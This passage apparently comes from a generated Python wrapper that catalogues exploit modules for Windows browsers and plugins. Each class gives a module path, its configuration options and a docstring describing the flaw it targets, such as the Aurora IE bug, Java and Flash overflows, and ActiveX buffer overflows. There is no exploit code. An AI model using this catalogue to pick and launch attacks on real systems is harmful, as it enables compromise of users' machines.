			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_ms09_043_owc_msdso(object):
		"""
		
        This module exploits a memory corruption vulnerability within versions 10 and 11 of
        the Office Web Component Spreadsheet ActiveX control. This module was based on
        an exploit found in the wild.
      
		"""

		path = 'windows/browser/ms09_043_owc_msdso'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_java_basicservice_impl(object):
		"""
		
      This module exploits a vulnerability in Java Runtime Environment
      that allows an attacker to escape the Java Sandbox. By injecting
      a parameter into a javaws call within the BasicServiceImpl class
      the default java sandbox policy file can be therefore overwritten.
      The vulnerability affects version 6 prior to update 22.

      NOTE: Exploiting this vulnerability causes several sinister-looking
      popup windows saying that Java is "Downloading application."
      
		"""

		path = 'windows/browser/java_basicservice_impl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'

	class windows_browser_ms10_002_aurora(object):
		"""
		
          This module exploits a memory corruption flaw in Internet Explorer. This
        flaw was found in the wild and was a key component of the "Operation Aurora"
        attacks that lead to the compromise of a number of high profile companies. The
        exploit code is a direct port of the public sample published to the Wepawet
        malware analysis site. The technique used by this module is currently identical
        to the public sample, as such, only Internet Explorer 6 can be reliably exploited.
      
		"""

		path = 'windows/browser/ms10_002_aurora'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_symantec_backupexec_pvcalendar(object):
		"""
		
          This module exploits a stack buffer overflow in Symantec BackupExec Calendar Control.
        By sending an overly long string to the "_DOWText0" property located
        in the pvcalendar.ocx control, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/browser/symantec_backupexec_pvcalendar'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_apple_quicktime_smil_debug(object):
		"""
		
          This module exploits a buffer overflow in Apple QuickTime
        7.6.6. When processing a malformed SMIL uri, a stack-based buffer
        overflow can occur when logging an error message.
      
		"""

		path = 'windows/browser/apple_quicktime_smil_debug'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_adobe_flash_mp4_cprt(object):
		"""
		
        This module exploits a vulnerability found in Adobe Flash
        Player.  By supplying a corrupt .mp4 file loaded by Flash, it
        is possible to gain arbitrary remote code execution under the
        context of the user.

        This vulnerability has been exploited in the wild as part of
        the "Iran's Oil and Nuclear Situation.doc" e-mail attack.
        According to the advisory, 10.3.183.15 and 11.x before
        11.1.102.62 are affected.
      
		"""

		path = 'windows/browser/adobe_flash_mp4_cprt'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_imgeviewer_tifmergemultifiles(object):
		"""
		
          This module exploits a stack based buffer overflow in the Active control file
        ImageViewer2.OCX by passing a overly long argument to an insecure TifMergeMultiFiles()
        method. Exploitation results in code execution with the privileges of the user who
        browsed to the exploit page.

        The victim will first be required to trust the publisher Viscom Software.
        This module has been designed to bypass DEP and ASLR under XP IE8, Vista and Win7
        with Java support.
      
		"""

		path = 'windows/browser/imgeviewer_tifmergemultifiles'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ntr_activex_check_bof(object):
		"""
		
          This module exploits a vulnerability found in NTR ActiveX 1.1.8. The
        vulnerability exists in the Check() method, due to the insecure usage of strcat to
        build a URL using the bstrParams parameter contents (note: this is also the reason
        why the module won't allow you to modify the URIPATH), which leads to code execution
        under the context of the user visiting a malicious web page. In order to bypass
        DEP and ASLR on Windows Vista and Windows 7 JRE 6 is needed.
      
		"""

		path = 'windows/browser/ntr_activex_check_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_hp_alm_xgo_setshapenodetype_exec(object):
		"""
		
          This module exploits a vulnerability within the XGO.ocx ActiveX Control
        installed with the HP Application Lifecycle Manager Client. The vulnerability
        exists in the SetShapeNodeType method, which allows the user to specify memory
        that will be used as an object, through the node parameter. It allows to control
        the dereference and use of a function pointer. This module has been successfully
        tested with HP Application Lifecycle Manager 11.50 and requires JRE 6 in order to
        bypass DEP and ASLR.
      
		"""

		path = 'windows/browser/hp_alm_xgo_setshapenodetype_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_cisco_webex_ext(object):
		"""
		
        This module exploits a vulnerability present in the Cisco WebEx Chrome Extension
        version 1.0.1 which allows an attacker to execute arbitrary commands on a system.
        
		"""

		path = 'windows/browser/cisco_webex_ext'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_hp_loadrunner_writefilestring(object):
		"""
		
        This module exploits a vulnerability on the lrFileIOService ActiveX, as installed
        with HP LoadRunner 11.50. The vulnerability exists in the WriteFileString method,
        which allow the user to write arbitrary files. It's abused to drop a payload
        embedded in a dll, which is later loaded through the Init() method from the
        lrMdrvService control, by abusing an insecure LoadLibrary call. This module has
        been tested successfully on IE8 on Windows XP. Virtualization based on the Low
        Integrity Process, on Windows Vista and 7, will stop this module because the DLL
        will be dropped to a virtualized folder, which isn't used by LoadLibrary.
      
		"""

		path = 'windows/browser/hp_loadrunner_writefilestring'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_gom_openurl(object):
		"""
		
          This module exploits a stack buffer overflow in GOM Player 2.1.6.3499.
        By sending an overly long string to the "OpenUrl()" method located
        in the GomWeb3.dll Control, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/browser/gom_openurl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_toolbutton(object):
		"""
		
        This module exploits an use after free condition on Adobe Reader versions 11.0.2, 10.1.6
        and 9.5.4 and prior. The vulnerability exists while handling the ToolButton object, where
        the cEnable callback can be used to early free the object memory. Later use of the object
        allows triggering the use after free condition. This module has been tested successfully
        on Adobe Reader 11.0.2 and 10.0.4, with IE and Windows XP SP3, as exploited in the wild in
        November, 2013. At the moment, this module doesn't support Adobe Reader 9 targets; in order
        to exploit Adobe Reader 9 the fileformat version of the exploit can be used.
      
		"""

		path = 'windows/browser/adobe_toolbutton'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_novelliprint_callbackurl(object):
		"""
		
          This module exploits a stack-based buffer overflow in Novell iPrint Client 5.42.
        When sending an overly long string to the 'call-back-url' parameter in an
        op-client-interface-version action of ienipp.ocx an attacker may be able to
        execute arbitrary code.
      
		"""

		path = 'windows/browser/novelliprint_callbackurl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms08_070_visual_studio_msmask(object):
		"""
		
          This module exploits a stack buffer overflow in Microsoft's Visual Studio 6.0.
        When passing a specially crafted string to the Mask parameter of the
        Mdmask32.ocx ActiveX Control, an attacker may be able to execute arbitrary
        code.
      
		"""

		path = 'windows/browser/ms08_070_visual_studio_msmask'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_roxio_cineplayer(object):
		"""
		
          This module exploits a stack-based buffer overflow in SonicPlayer ActiveX
        control (SonicMediaPlayer.dll) 3.0.0.1 installed by Roxio CinePlayer 3.2.
        By setting an overly long value to 'DiskType', an attacker can overrun
        a buffer and execute arbitrary code.
      
		"""

		path = 'windows/browser/roxio_cineplayer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_java_docbase_bof(object):
		"""
		
          This module exploits a flaw in the new plugin component of the Sun Java
        Runtime Environment before v6 Update 22. By specifying specific parameters
        to the new plugin, an attacker can cause a stack-based buffer overflow and
        execute arbitrary code.

        When the new plugin is invoked with a "launchjnlp" parameter, it will
        copy the contents of the "docbase" parameter to a stack-buffer using the
        "sprintf" function. A string of 396 bytes is enough to overflow the 256
        byte stack buffer and overwrite some local variables as well as the saved
        return address.

        NOTE: The string being copied is first passed through the "WideCharToMultiByte".
        Due to this, only characters which have a valid localized multibyte
        representation are allowed. Invalid characters will be replaced with
        question marks ('?').

        This vulnerability was originally discovered independently by both Stephen
        Fewer and Berend Jan Wever (SkyLined). Although exhaustive testing hasn't
        been done, all versions since version 6 Update 10 are believed to be affected
        by this vulnerability.

        This vulnerability was patched as part of the October 2010 Oracle Patch
        release.
      
		"""

		path = 'windows/browser/java_docbase_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_mozilla_firefox_onreadystatechange(object):
		"""
		
        This module exploits a vulnerability found on Firefox 17.0.6, specifically an use
        after free of a DocumentViewerImpl object, triggered via an specially crafted web
        page using onreadystatechange events and the window.stop() API, as exploited in the
        wild on 2013 August to target Tor Browser users.
      
		"""

		path = 'windows/browser/mozilla_firefox_onreadystatechange'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_aladdin_choosefilepath_bof(object):
		"""
		
          This module exploits a vulnerability found in Aladdin Knowledge System's
        ActiveX component.  By supplying a long string of data to the ChooseFilePath()
        function, a buffer overflow occurs, which may result in remote code execution
        under the context of the user.
      
		"""

		path = 'windows/browser/aladdin_choosefilepath_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_adobe_flashplayer_arrayindexing(object):
		"""
		
          This module exploits a vulnerability in Adobe Flash Player versions 10.3.181.23
        and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification
        logic. This results in unsafe JIT(Just-In-Time) code being executed. This is the same
        vulnerability that was used for attacks against Korean based organizations.

          Specifically, this issue occurs when indexing an array using an arbitrary value,
        memory can be referenced and later executed. Taking advantage of this issue does not rely
        on heap spraying as the vulnerability can also be used for information leakage.

          Currently this exploit works for IE6, IE7, IE8, Firefox 10.2 and likely several
        other browsers under multiple Windows platforms. This exploit bypasses ASLR/DEP and
        is very reliable.
        
		"""

		path = 'windows/browser/adobe_flashplayer_arrayindexing'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
